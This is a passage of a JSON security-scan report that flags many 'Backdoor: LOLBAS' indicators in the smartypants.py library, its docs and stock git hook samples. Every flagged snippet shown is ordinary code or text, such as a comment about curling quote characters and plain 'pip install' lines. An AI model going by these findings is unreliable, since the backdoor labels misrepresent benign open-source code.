                    "text": "                \\s          |   # a whitespace char, or\n                &nbsp;      |   # a non-breaking space entity, or\n                --          |   # dashes, or\n                &[mn]dash;  |   # named dash entities\n                %s          |   # or decimal entities\n                &\\#x201[34];    # or hex\n            )\n",
                    "rendered": {
                      "text": "                \\s          |   # a whitespace char, or\n                &nbsp;      |   # a non-breaking space entity, or\n                --          |   # dashes, or\n                &[mn]dash;  |   # named dash entities\n                %s          |   # or decimal entities\n                &\\#x201[34];    # or hex\n            )\n",
                      "markdown": "`                \\s          |   # a whitespace char, or\n                &nbsp;      |   # a non-breaking space entity, or\n                --          |   # dashes, or\n                &[mn]dash;  |   # named dash entities\n                %s          |   # or decimal entities\n                &\\#x201[34];    # or hex\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/smartypants.py"
                },
                "region": {
                  "startLine": 332,
                  "startColumn": 39,
                  "endLine": 332,
                  "endColumn": 45,
                  "snippet": {
                    "text": "                \\s          |   # a whitespace char, or\n                &nbsp;      |   # a non-breaking space entity, or\n                --          |   # dashes, or\n                &[mn]dash;  |   # named dash entities\n                %s          |   # or decimal entities\n                &\\#x201[34];    # or hex\n            )\n",
                    "rendered": {
                      "text": "                \\s          |   # a whitespace char, or\n                &nbsp;      |   # a non-breaking space entity, or\n                --          |   # dashes, or\n                &[mn]dash;  |   # named dash entities\n                %s          |   # or decimal entities\n                &\\#x201[34];    # or hex\n            )\n",
                      "markdown": "`                \\s          |   # a whitespace char, or\n                &nbsp;      |   # a non-breaking space entity, or\n                --          |   # dashes, or\n                &[mn]dash;  |   # named dash entities\n                %s          |   # or decimal entities\n                &\\#x201[34];    # or hex\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/smartypants.py"
                },
                "region": {
                  "startLine": 214,
                  "startColumn": 33,
                  "endLine": 214,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    # for one-character tokens that consist of\n    # just a quote char. What we do is remember\n    # the last character of the previous text\n    # token, to use as context to curl single-\n    # character quote tokens correctly.\n\n    tags_to_skip_regex = _tags_to_skip_regex()\n",
                    "rendered": {
                      "text": "    # for one-character tokens that consist of\n    # just a quote char. What we do is remember\n    # the last character of the previous text\n    # token, to use as context to curl single-\n    # character quote tokens correctly.\n\n    tags_to_skip_regex = _tags_to_skip_regex()\n",
                      "markdown": "`    # for one-character tokens that consist of\n    # just a quote char. What we do is remember\n    # the last character of the previous text\n    # token, to use as context to curl single-\n    # character quote tokens correctly.\n\n    tags_to_skip_regex = _tags_to_skip_regex()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/smartypants.py"
                },
                "region": {
                  "startLine": 91,
                  "startColumn": 16,
                  "endLine": 91,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    ordinarily, entities are used for the explicit purpose of representing the\n    specific character they represent). The \"w\" option must be used in\n    conjunction with one (or both) of the other quote options (\"q\" or \"b\").\n    Thus, if you wish to apply all SmartyPants transformations (quotes, en-\n    and em-dashes, and ellipses) and also convert ``&quot;`` entities into\n    regular quotes so SmartyPants can educate them.\n    \"\"\"\n",
                    "rendered": {
                      "text": "    ordinarily, entities are used for the explicit purpose of representing the\n    specific character they represent). The \"w\" option must be used in\n    conjunction with one (or both) of the other quote options (\"q\" or \"b\").\n    Thus, if you wish to apply all SmartyPants transformations (quotes, en-\n    and em-dashes, and ellipses) and also convert ``&quot;`` entities into\n    regular quotes so SmartyPants can educate them.\n    \"\"\"\n",
                      "markdown": "`    ordinarily, entities are used for the explicit purpose of representing the\n    specific character they represent). The \"w\" option must be used in\n    conjunction with one (or both) of the other quote options (\"q\" or \"b\").\n    Thus, if you wish to apply all SmartyPants transformations (quotes, en-\n    and em-dashes, and ellipses) and also convert ``&quot;`` entities into\n    regular quotes so SmartyPants can educate them.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/conf.py"
                },
                "region": {
                  "startLine": 192,
                  "startColumn": 65,
                  "endLine": 192,
                  "endColumn": 69,
                  "snippet": {
                    "text": "   u'Yu-Jie Lin', 'manual'),\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n#latex_logo = None\n\n",
                    "rendered": {
                      "text": "   u'Yu-Jie Lin', 'manual'),\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n#latex_logo = None\n\n",
                      "markdown": "`   u'Yu-Jie Lin', 'manual'),\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n#latex_logo = None\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/conf.py"
                },
                "region": {
                  "startLine": 127,
                  "startColumn": 55,
                  "endLine": 127,
                  "endColumn": 59,
                  "snippet": {
                    "text": "# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = ['_static']\n\n# If not '', a 'Last updated on:' timestamp is inserted at every page bottom,\n# using the given strftime format.\n#html_last_updated_fmt = '%b %d, %Y'\n\n",
                    "rendered": {
                      "text": "# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = ['_static']\n\n# If not '', a 'Last updated on:' timestamp is inserted at every page bottom,\n# using the given strftime format.\n#html_last_updated_fmt = '%b %d, %Y'\n\n",
                      "markdown": "`# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = ['_static']\n\n# If not '', a 'Last updated on:' timestamp is inserted at every page bottom,\n# using the given strftime format.\n#html_last_updated_fmt = '%b %d, %Y'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/conf.py"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 65,
                  "endLine": 113,
                  "endColumn": 69,
                  "snippet": {
                    "text": "# A shorter title for the navigation bar.  Default is the same as html_title.\n#html_short_title = None\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n#html_logo = None\n\n",
                    "rendered": {
                      "text": "# A shorter title for the navigation bar.  Default is the same as html_title.\n#html_short_title = None\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n#html_logo = None\n\n",
                      "markdown": "`# A shorter title for the navigation bar.  Default is the same as html_title.\n#html_short_title = None\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n#html_logo = None\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/conf.py"
                },
                "region": {
                  "startLine": 192,
                  "startColumn": 72,
                  "endLine": 192,
                  "endColumn": 77,
                  "snippet": {
                    "text": "   u'Yu-Jie Lin', 'manual'),\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n#latex_logo = None\n\n",
                    "rendered": {
                      "text": "   u'Yu-Jie Lin', 'manual'),\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n#latex_logo = None\n\n",
                      "markdown": "`   u'Yu-Jie Lin', 'manual'),\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n#latex_logo = None\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/conf.py"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 72,
                  "endLine": 114,
                  "snippet": {
                    "text": "# A shorter title for the navigation bar.  Default is the same as html_title.\n#html_short_title = None\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n#html_logo = None\n\n# The name of an image file (within the static path) to use as favicon of the\n",
                    "rendered": {
                      "text": "# A shorter title for the navigation bar.  Default is the same as html_title.\n#html_short_title = None\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n#html_logo = None\n\n# The name of an image file (within the static path) to use as favicon of the\n",
                      "markdown": "`# A shorter title for the navigation bar.  Default is the same as html_title.\n#html_short_title = None\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n#html_logo = None\n\n# The name of an image file (within the static path) to use as favicon of the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/introduction.rst"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 1,
                  "endLine": 67,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\nor::\n\n  pip install hg+ssh://hg@bitbucket.org/livibetter/smartypants.py\n",
                    "rendered": {
                      "text": "\nor::\n\n  pip install hg+ssh://hg@bitbucket.org/livibetter/smartypants.py\n",
                      "markdown": "`\nor::\n\n  pip install hg+ssh://hg@bitbucket.org/livibetter/smartypants.py\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/introduction.rst"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 1,
                  "endLine": 63,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\nIf you want to install latest development code, you can run::\n\n  pip install hg+https://bitbucket.org/livibetter/smartypants.py\n\nor::\n\n",
                    "rendered": {
                      "text": "\nIf you want to install latest development code, you can run::\n\n  pip install hg+https://bitbucket.org/livibetter/smartypants.py\n\nor::\n\n",
                      "markdown": "`\nIf you want to install latest development code, you can run::\n\n  pip install hg+https://bitbucket.org/livibetter/smartypants.py\n\nor::\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/introduction.rst"
                },
                "region": {
                  "startLine": 57,
                  "startColumn": 1,
                  "endLine": 57,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\nsmartypants package on PyPI_ can be installed via ``pip``::\n\n  pip install smartypants\n\n.. _PyPI: https://pypi.python.org/pypi/smartypants/\n\n",
                    "rendered": {
                      "text": "\nsmartypants package on PyPI_ can be installed via ``pip``::\n\n  pip install smartypants\n\n.. _PyPI: https://pypi.python.org/pypi/smartypants/\n\n",
                      "markdown": "`\nsmartypants package on PyPI_ can be installed via ``pip``::\n\n  pip install smartypants\n\n.. _PyPI: https://pypi.python.org/pypi/smartypants/\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/introduction.rst"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 23,
                  "endLine": 41,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  text = '\"SmartyPants\" is smart, so is <code>smartypants</code> -- a Python port'\n  print(smartypants.smartypants(text))\n\nTo use the command-line script ``smartypants``:\n\n.. code:: sh\n\n",
                    "rendered": {
                      "text": "  text = '\"SmartyPants\" is smart, so is <code>smartypants</code> -- a Python port'\n  print(smartypants.smartypants(text))\n\nTo use the command-line script ``smartypants``:\n\n.. code:: sh\n\n",
                      "markdown": "`  text = '\"SmartyPants\" is smart, so is <code>smartypants</code> -- a Python port'\n  print(smartypants.smartypants(text))\n\nTo use the command-line script ``smartypants``:\n\n.. code:: sh\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-merge-commit.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 74,
                  "endLine": 74,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n",
                    "rendered": {
                      "text": "\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n",
                      "markdown": "`\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 2,
                  "endLine": 65,
                  "endColumn": 8,
                  "snippet": {
                    "text": "unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n",
                    "rendered": {
                      "text": "unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n",
                      "markdown": "`unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 54,
                  "endLine": 54,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n",
                    "rendered": {
                      "text": "\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n",
                      "markdown": "`\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 53,
                  "endLine": 53,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n",
                    "rendered": {
                      "text": "\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n",
                      "markdown": "`\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 27,
                  "endLine": 51,
                  "endColumn": 33,
                  "snippet": {
                    "text": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n",
                    "rendered": {
                      "text": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n",
                      "markdown": "`if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 34,
                  "endLine": 34,
                  "endColumn": 5,
                  "snippet": {
                    "text": "validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n",
                    "rendered": {
                      "text": "validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n",
                      "markdown": "`validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 69,
                  "endLine": 11,
                  "endColumn": 74,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-applypatch.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
